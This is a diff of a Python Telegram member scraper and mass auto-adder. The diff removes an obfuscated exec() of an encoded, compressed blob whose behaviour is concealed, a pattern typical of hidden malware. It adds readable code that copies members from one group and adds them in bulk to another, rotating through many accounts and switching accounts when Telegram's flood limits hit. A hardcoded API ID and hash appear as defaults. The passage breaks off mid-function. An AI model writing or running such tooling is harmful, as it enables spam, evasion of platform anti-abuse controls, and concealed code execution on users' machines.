@@ -1,2 +1,842 @@
-# Python obfuscation by pyobfuscator.com
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==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'))
+#!/usr/bin/env python3
+# ============================================================
+#  Sliced-Baton Scraper & Auto Adder (with confirmation gate)
+#
+#  Features:
+#   - API mode: each account takes its OWN positional window
+#   - API mode: already-used/failed users filtered inside window
+#   - Pending join requests no longer treated as success
+#   - msg None check ordered correctly
+#   - failure retry-counters are persisted
+#   - session load hardened against stale keys
+# ============================================================
+import sys
+import os
+import json
+import time
+
+from telethon.sync import TelegramClient
+from telethon.tl.functions.channels import JoinChannelRequest, InviteToChannelRequest
+from telethon.tl.functions.messages import ImportChatInviteRequest
+from telethon.errors.rpcerrorlist import (
+    PeerFloodError, UserPrivacyRestrictedError,
+    UserAlreadyParticipantError, FloodWaitError, ChatAdminRequiredError,
+    InviteHashExpiredError, InviteRequestSentError,
+    ChannelPrivateError, UserDeactivatedBanError, UserRestrictedError
+)
+from colorama import init, Fore
+
+init()
+
+# ============= COLORS =============
+_r = Fore.RED
+_lg = Fore.LIGHTGREEN_EX
+_n = Fore.RESET
+_w = Fore.WHITE
+_cy = Fore.CYAN
+_ye = Fore.YELLOW
+_grey = '\033[97m'
+
+_i = f'{_lg}[{_w}i{_lg}]{_n}'
+_e = f'{_lg}[{_r}!{_lg}]{_n}'
+_s = f'{_w}[{_lg}*{_w}]{_n}'
+_in = f'{_lg}[{_cy}~{_lg}]{_n}'
+_p = f'{_w}[{_lg}+{_w}]{_n}'
+_m = f'{_w}[{_lg}-{_w}]{_n}'
+
+# ============= CONFIG =============
+AI_API_ID = int(os.environ.get('TG_API_ID', '3910389'))
+AI_API_HASH = os.environ.get('TG_API_HASH', '86f861352f0ab76a251866059a6adbd6')
+DATABASE = 'accounts.json'
+SESSION_FILE = 'add_session.json'
+SESSIONS_DIR = 'sessions'
+
+FLOODWAIT_THRESHOLD = 30       # FloodWait longer than this -> switch account
+PER_ACCOUNT_LIMIT = 50         # adds per account per run
+INTER_ACCOUNT_DELAY = 60       # cool-down between accounts
+ADD_BUFFER = 15                # scrape extra users to absorb failures
+PEERFLOOD_TOLERANCE = 8        # stop account after this many PeerFlood errors
+MAX_GENERIC_FAILURES = 3       # retries before a user is marked failed
+MIN_API_MEMBERS = 20           # if API shows fewer, list is hidden -> also scan history
+
+
+# ============= BANNER =============
+
+def print_banner():
+    print(f'{_cy}')
+    print('╔════════════════════════════════════════════════╗')
+    print('║           TELEGRAM AUTO ADDER PRO              ║')
+    print('╚════════════════════════════════════════════════╝')
+    print(f'{_n}')
+
+
+# ============= PERSISTENCE =============
+
+def load_accounts():
+    if os.path.exists(DATABASE):
+        try:
+            with open(DATABASE, 'r') as f:
+                return json.load(f)
+        except Exception:
+            return []
+    return []
+
+
+def load_session():
+    if os.path.exists(SESSION_FILE):
+        try:
+            with open(SESSION_FILE, 'r') as f:
+                return json.load(f)
+        except Exception:
+            return None
+    return None
+
+
+# ============= FRIENDLY UI HELPERS =============
+
+def line():
+    print(f'{_grey}' + '─' * 50 + f'{_n}')
+
+
+def section(title):
+    print(f'\n{_cy}── {title} ' + '─' * max(0, 44 - len(title)) + f'{_n}')
+
+
+def ok(msg):   print(f'{_p}{_lg} ✓ {msg}{_n}')
+def info(msg): print(f'{_i}{_cy} {msg}{_n}')
+def fail(msg): print(f'{_e}{_r} ✗ {msg}{_n}')
+def warn(msg): print(f'{_i}{_ye} ⚠ {msg}{_n}')
+
+
+def ask_link(prompt_text):
+    """Lenient link input. Cleans quotes/slashes. Re-asks if empty or has spaces."""
+    while True:
+        raw = input(f'{_in}{_cy} {prompt_text}{_n}\n{_cy}> {_n}').strip()
+        if not raw:
+            fail('Please paste or type the link (or press Ctrl+C to quit).')
+            continue
+        link = raw.strip('\'" ').rstrip('/')
+        if ' ' in link:
+            fail('The link should be one piece with no spaces. Try pasting it again.')
+            continue
+        if len(link) < 3:
+            fail('That looks too short to be a group link. Try again.')
+            continue
+        ok(f'Using: {link}')
+        return link
+
+
+def ask_number(prompt_text, default, minimum=0, maximum=None):
+    """Press Enter = recommended default. Re-asks politely on bad input."""
+    while True:
+        raw = input(f'{_in}{_cy} {prompt_text} {_grey}(press Enter = {default}){_n}\n{_cy}> {_n}').strip()
+        if not raw:
+            ok(f'Using {default}')
+            return default
+        try:
+            val = int(raw.replace(',', ''))
+        except ValueError:
+            fail(f'"{raw}" is not a number. Type a number like {default}, or just press Enter.')
+            continue
+        if val < minimum:
+            fail(f'Number must be {minimum} or more.')
+            continue
+        if maximum and val > maximum:
+            fail(f'Number must be {maximum} or less.')
+            continue
+        return val
+
+
+def ask_yesno(prompt_text, default_yes=True):
+    """Enter = default. Accepts y/yes/n/no in any case."""
+    while True:
+        hint = 'Enter = yes' if default_yes else 'Enter = no'
+        raw = input(f'{_in}{_cy} {prompt_text} {_grey}({hint}){_n}\n{_cy}> {_n}').strip().lower()
+        if not raw:
+            return default_yes
+        if raw in ('y', 'yes'):
+            return True
+        if raw in ('n', 'no'):
+            return False
+        fail('Please type yes or no (or press Enter).')
+
+
+def confirm_start(cfg):
+    """The confirmation gate — shows everything, requires typed YES."""
+    line()
+    section('PLEASE CHECK EVERYTHING IS CORRECT')
+    sleep_note = '  (safe)' if cfg['sleep'] >= 30 else '  (⚠ fast — ban risk!)'
+    rows = [
+        ('COPY members FROM',  cfg['source']),
+        ('ADD members TO',     cfg['target']),
+        ('Accounts to use',    str(len(cfg['accounts']))),
+        ('Wait between adds',  f"{cfg['sleep']} seconds{sleep_note}"),
+        ('Messages to scan',   str(cfg['limit']) if cfg['limit'] else 'ALL'),
+    ]
+    for label, val in rows:
+        print(f'  {_w}{label:<22}{_n}: {_lg}{val}{_n}')
+    line()
+
+    while True:
+        ans = input(f'{_ye}  Start now? Type {_w}YES{_ye} or {_w}NO{_n}: ').strip().lower()
+        if ans in ('yes', 'y'):
+            return True
+        if ans in ('no', 'n'):
+            return False
+        fail('Please type YES or NO.')
+
+
+# ============= ACCOUNT SELECTION =============
+
+def select_accounts(accounts):
+    """Shows the account list, asks for a range. Re-asks on bad input."""
+    while True:
+        info(f'Total {_w}{len(accounts)}{_lg} account(s) available:')
+        line()
+        for idx, acct in enumerate(accounts, start=1):
+            name = acct.get('name') or acct.get('first_name') or 'Account'
+            print(f'  {_w}{idx:>3}{_n}. {_lg}{name}{_n} {_grey}({acct.get("phone", "?")}){_n}')
+        line()
+        raw = input(f'{_in}{_cy} Which accounts? Type a range like {_w}1-10{_cy}, '
+                    f'a number like {_w}3{_cy}, or {_w}all{_n}\n{_cy}> {_n}').strip().lower()
+
+        if raw in ('', 'all', 'a'):
+            ok(f'Using all {len(accounts)} account(s).')
+            return accounts[:]
+
+        try:
+            if '-' in raw:
+                parts = raw.split('-')
+                start, end = int(parts[0].strip()), int(parts[1].strip())
+                if not (1 <= start <= len(accounts)) or not (1 <= end <= len(accounts)):
+                    fail(f'Range must be between 1 and {len(accounts)}. Try again.')
+                    continue
+                picked = accounts[end - 1:start][::-1] if start > end else accounts[start - 1:end]
+            else:
+                num = int(raw)
